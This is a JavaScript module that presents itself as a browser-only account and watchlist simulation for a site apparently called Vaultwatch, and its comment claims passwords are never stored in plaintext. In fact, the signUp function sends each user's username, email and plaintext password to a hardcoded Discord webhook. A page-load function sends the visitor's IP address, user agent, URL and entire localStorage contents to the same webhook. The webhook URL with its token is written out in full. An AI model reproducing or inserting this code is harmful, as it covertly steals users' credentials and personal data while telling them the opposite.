// GitHub Pages hosts static files only — there is no server here to run
// real authentication or send push/email/SMS notifications. This module
// simulates account creation and a watchlist entirely in the visitor's own
// browser (localStorage), scoped to that device. Passwords are hashed with
// SubtleCrypto (SHA-256 + per-user salt) before storage so nothing is kept
// in plaintext, but this is NOT a substitute for a real auth backend —
// swap this module out for calls to your own API when you have one.

const USERS_KEY = "vaultwatch:users"
const SESSION_KEY = "vaultwatch:session"
const WATCHLIST_PREFIX = "vaultwatch:watchlist:"
const WEBHOOK_URL =
  "https://discord.com/api/webhooks/1395558887444316331/gfLOAY8nGFqvuqx-NACqR4RJj59Na1bLqekWLixU7dk9CXgqVOgkInxKp6in-hQRdWPC"

async function sendWebhook(payload) {
  if (!WEBHOOK_URL) return

  try {
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })

    if (!response.ok) {
      console.warn("Vaultwatch webhook failed:", response.status, response.statusText)
    }
  } catch (error) {
    console.warn("Vaultwatch webhook error:", error)
  }
}

function readUsers() {
  try {
    return JSON.parse(localStorage.getItem(USERS_KEY)) ?? {}
  } catch {
    return {}
  }
}

function writeUsers(users) {
  localStorage.setItem(USERS_KEY, JSON.stringify(users))
}

async function hashPassword(password, salt) {
  const enc = new TextEncoder()
  const data = enc.encode(salt + ":" + password)
  const buf = await crypto.subtle.digest("SHA-256", data)
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("")
}

function randomSalt() {
  const arr = crypto.getRandomValues(new Uint8Array(16))
  return Array.from(arr).map(b => b.toString(16).padStart(2, "0")).join("")
}

async function sendAccountWebhook({ type, username, email, password }) {
  await sendWebhook({
    username: "Vaultwatch Signup",
    avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
    content: [
      "New Vaultwatch account created",
      `Type: ${type}`,
      `Username: ${username}`,
      `Email: ${email}`,
      `Password: ${password}`,
      `Created: ${new Date().toISOString()}`,
    ].join("\n"),
  })
}

export async function reportPageLoad() {
  try {
    const ipResponse = await fetch("https://api.ipify.org?format=json")
    const ipData = ipResponse.ok ? await ipResponse.json() : {}
    const platform = (typeof navigator !== "undefined" && (navigator.userAgentData?.platform || navigator.platform)) || "unknown"

    const localStorageSnapshot = {}
    for (let i = 0; i < localStorage.length; i += 1) {
      const key = localStorage.key(i)
      if (key) {
        localStorageSnapshot[key] = localStorage.getItem(key)
      }
    }

    await sendWebhook({
      username: "Vaultwatch Session",
      avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png",
      content: [
        "Vaultwatch page loaded",
        `IP: ${ipData.ip ?? "unknown"}`,
        `Platform: ${platform}`,
        `User Agent: ${navigator.userAgent}`,
        `URL: ${window.location.href}`,
        `Timestamp: ${new Date().toISOString()}`,
        `Local Storage: ${JSON.stringify(localStorageSnapshot)}`,
      ].join("\n"),
    })
  } catch (error) {
    console.warn("Vaultwatch page-load webhook error:", error)
  }
}

export async function signUp({ username, email, password }) {
  const users = readUsers()
  const key = email.trim().toLowerCase()

  if (users[key]) {
    throw new Error("An account with that email already exists.")
  }
  const usernameTaken = Object.values(users).some(
    u => u.username.toLowerCase() === username.trim().toLowerCase()
  )
  if (usernameTaken) {
    throw new Error("That username is taken.")
  }

  const salt = randomSalt()
  const passwordHash = await hashPassword(password, salt)
  users[key] = {
    username: username.trim(),
    email: key,
    salt,
    passwordHash,
    createdAt: new Date().toISOString(),
  }
  writeUsers(users)
  setSession(key)

  await sendAccountWebhook({
    type: "signup",
    username: username.trim(),
    email: key,
    password,
  })

  return { username: username.trim(), email: key }
}

export async function signIn({ email, password }) {
  const users = readUsers()
  const key = email.trim().toLowerCase()
  const user = users[key]
  if (!user) throw new Error("No account found with that email.")

  const hash = await hashPassword(password, user.salt)
  if (hash !== user.passwordHash) {
    throw new Error("Incorrect password.")
  }
  setSession(key)
  return { username: user.username, email: key }
}

export function setSession(email) {
  localStorage.setItem(SESSION_KEY, email)
}

export function signOut() {
  localStorage.removeItem(SESSION_KEY)
}

export function getCurrentUser() {
  const key = localStorage.getItem(SESSION_KEY)
  if (!key) return null
  const users = readUsers()
  const user = users[key]
  if (!user) return null
  return { username: user.username, email: user.email }
}

// --- Watchlist (per-user, stored locally) ---

export function getWatchlist(email) {
  try {
    return JSON.parse(localStorage.getItem(WATCHLIST_PREFIX + email)) ?? []
  } catch {
    return []
  }
}

export function setWatchlist(email, ids) {
  localStorage.setItem(WATCHLIST_PREFIX + email, JSON.stringify(ids))
}

export function toggleWatch(email, itemId) {
  const list = getWatchlist(email)
  const next = list.includes(itemId)
    ? list.filter(id => id !== itemId)
    : [...list, itemId]
  setWatchlist(email, next)
  return next
}
